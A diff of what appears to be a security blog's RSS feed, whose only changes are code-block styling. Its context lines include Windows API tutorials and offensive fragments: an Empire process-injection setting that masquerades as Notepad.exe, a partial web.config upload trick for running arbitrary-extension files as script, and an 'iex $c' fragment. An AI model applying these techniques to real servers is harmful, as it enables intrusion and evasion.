-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication1.cpp : This file contains the &amp;#39;main&amp;#39; function. Program execution begins and ends there.
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -3971,7 +3971,7 @@ iex $c;
 &lt;li&gt;HeapDestory // 销毁堆句柄&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="0x02-heapcreate-example"&gt;0x02 HeapCreate Example&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// 堆管理
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;#34;stdafx.h&amp;#34;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -4072,7 +4072,7 @@ iex $c;
 &lt;p&gt;为了保证多线程读写全局变量达到同步，可以使用临界区技术，Windows正是实现了这个技术，提供了对应的API。&lt;/p&gt;
 &lt;h2 id="0x01-令牌线程同步"&gt;0x01 令牌线程同步&lt;/h2&gt;
 &lt;p&gt;代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;#34;stdafx.h&amp;#34;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -4131,7 +4131,7 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;/ul&gt;
 &lt;p&gt;首先需要创建一个文件句柄，然后再创建一个文件映射的Mapping内核对象，通过映射获得视图。&lt;/p&gt;
 &lt;h2 id="0x02-文件映射简单代码"&gt;0x02 文件映射简单代码&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;#34;stdafx.h&amp;#34;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -4164,7 +4164,7 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x03-api-list"&gt;0x03 API List&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HANDLE WINAPI &lt;span style="color:#a6e22e"&gt;CreateFile&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HANDLE WINAPI &lt;span style="color:#a6e22e"&gt;CreateFile&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ LPCTSTR lpFileName,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ DWORD dwDesiredAccess,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ DWORD dwShareMode,
@@ -4174,7 +4174,7 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_opt_ HANDLE hTemplateFile
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HANDLE WINAPI &lt;span style="color:#a6e22e"&gt;CreateFileMapping&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HANDLE WINAPI &lt;span style="color:#a6e22e"&gt;CreateFileMapping&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ HANDLE hFile,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_opt_ LPSECURITY_ATTRIBUTES lpAttributes,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ DWORD flProtect,
@@ -4183,7 +4183,7 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_opt_ LPCTSTR lpName
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LPVOID WINAPI &lt;span style="color:#a6e22e"&gt;MapViewOfFile&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LPVOID WINAPI &lt;span style="color:#a6e22e"&gt;MapViewOfFile&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ HANDLE hFileMappingObject,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ DWORD dwDesiredAccess,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ DWORD dwFileOffsetHigh,
@@ -4191,16 +4191,16 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ SIZE_T dwNumberOfBytesToMap
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;FlushViewOfFile&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;FlushViewOfFile&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ LPCVOID lpBaseAddress,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ SIZE_T dwNumberOfBytesToFlush
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;UnmapViewOfFile&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;UnmapViewOfFile&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ LPCVOID lpBaseAddress
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;UnmapViewOfFile&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;UnmapViewOfFile&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ LPCVOID lpBaseAddress
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x04-创建一个超大文件"&gt;0x04 创建一个超大文件&lt;/h2&gt;
@@ -4225,7 +4225,7 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;li&gt;UTF16BE：FE FF&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="windows字符数据类型"&gt;Windows字符数据类型&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;CHAR &lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;char&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;CHAR &lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;char&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PSTR &lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;char&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;WCHAR &lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;wchar_t&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PWSTR &lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;wchar_t&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt;
@@ -4246,7 +4246,7 @@ LeaveCriticalSection(CRITICAL_SECTION *);//离开临界区
 &lt;li&gt;5.系统启动线程、映射DLL（ntdll.LdrInitalizeThunk）、线程开始执行&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="创建进程"&gt;创建进程&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL &lt;span style="color:#a6e22e"&gt;CreateProcess&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL &lt;span style="color:#a6e22e"&gt;CreateProcess&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LPCTSTR lpApplicationName,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LPTSTR lpCommandLine,
@@ -4370,7 +4370,7 @@ DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，�
 &lt;li&gt;FuzzySecurity Invoke-MS16-032&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="0x02-编译"&gt;0x02 编译&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-C#" data-lang="C#"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;bool&lt;/span&gt; AutoMasq = &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-C#" data-lang="C#"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;bool&lt;/span&gt; AutoMasq = &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;string&lt;/span&gt; masqBinary = &lt;span style="color:#e6db74"&gt;@&amp;#34;C:\Windows\Notepad.exe&amp;#34;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果AutoMasq为false，则不会进行进程注入，若为true，则会进行进程注入，伪装成C:\Windows\Notepad.exe.&lt;/p&gt;</description></item><item><title>Intranet Space - Empire</title><link>https://payloads.online/archivers/2018-12-18/1/</link><pubDate>Sat, 15 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-18/1/</guid><description>&lt;h2 id="0x00-简介"&gt;0x00 简介&lt;/h2&gt;
@@ -4498,7 +4498,7 @@ http http_foreign http_mapi onedrive
 &lt;p&gt;就目前来看，我发现从乙方的一些服务中能够直接转换到甲方技能的就是应急响应了，那么应急的时候，你难道还说：“我不需要懂内网渗透吗？？？？” - 倾旋 2018-11-23&lt;/p&gt;</description></item><item><title>ASP.NET 文件上传黑名单解决办法</title><link>https://payloads.online/archivers/2018-11-04/1/</link><pubDate>Sun, 04 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-04/1/</guid><description>&lt;h2 id="aspnet-文件上传黑名单解决办法"&gt;ASP.NET 文件上传黑名单解决办法&lt;/h2&gt;
 &lt;p&gt;来源：https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/&lt;/p&gt;
 &lt;p&gt;同过上传web.config配置文件可以使得任意扩展名的文件以脚本代码运行&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;handlers&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;accessPolicy=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;Read, Script, Write&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;
@@ -4519,7 +4519,7 @@ http http_foreign http_mapi onedrive
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;/appSettings&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上传完成web.config到Web目录下后，可以再上传&lt;code&gt;*.jpa&lt;/code&gt;的扩展名文件达到执行任意代码的目的。&lt;/p&gt;</description></item><item><title>解决Mac OS挂载NTFS格式硬盘无法读写</title><link>https://payloads.online/archivers/2018-10-30/1/</link><pubDate>Tue, 30 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-30/1/</guid><description>&lt;h2 id="查看分区"&gt;查看分区&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rvn0xsy@Rvn0xsy ~/&amp;gt; diskutil list
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rvn0xsy@Rvn0xsy ~/&amp;gt; diskutil list
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/dev/disk0 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;internal&lt;span style="color:#f92672"&gt;)&lt;/span&gt;:
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#: TYPE NAME SIZE IDENTIFIER&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; 0: GUID_partition_scheme 500.3 GB disk0
@@ -4554,7 +4554,7 @@ http http_foreign http_mapi onedrive
 &lt;p&gt;可根据自己的操作系统类型，选择对应的版本，我这里是Mac OSX&lt;/p&gt;
 &lt;p&gt;然后下载&lt;a href="https://github.com/PortSwigger/xss-validator/raw/master/xss-detector/xss.js"&gt;xss.js&lt;/a&gt;，将它放入phantomjs的执行目录。&lt;/p&gt;
 &lt;h2 id="0x02-测试之前的步骤"&gt;0x02 测试之前的步骤&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rvn0xsy@Rvn0xsy ~/G/p/bin&amp;gt; pwd
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rvn0xsy@Rvn0xsy ~/G/p/bin&amp;gt; pwd
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/Users/rvn0xsy/GitProject/phantomjs-2.1.1-macosx/bin
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rvn0xsy@Rvn0xsy ~/G/p/bin&amp;gt; ls
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;phantomjs xss.js
@@ -4627,7 +4627,7 @@ http http_foreign http_mapi onedrive
 &lt;p&gt;回收站的CLISD是：&lt;code&gt;::{645FF040-5081-101B-9F08-00AA002F954E}&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id="clsid是如何创建的"&gt;CLSID是如何创建的&lt;/h3&gt;
 &lt;p&gt;CLSID结构体：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {  
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {  
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	DWORD Data1; &lt;span style="color:#75715e"&gt;// 随机数  
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	WORD Data2; &lt;span style="color:#75715e"&gt;// 和时间相关  
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	WORD Data3; &lt;span style="color:#75715e"&gt;// 和时间相关  
@@ -4706,13 +4706,13 @@ Ping命令都不让用，限制很死。&lt;/p&gt;
 &lt;p&gt;virtualenv 用来建立一个虚拟的python环境，为了解决Python各种库的冲突问题。&lt;/p&gt;
 &lt;h2 id="0x01-virtualenv-安装"&gt;0x01 virtualenv 安装&lt;/h2&gt;
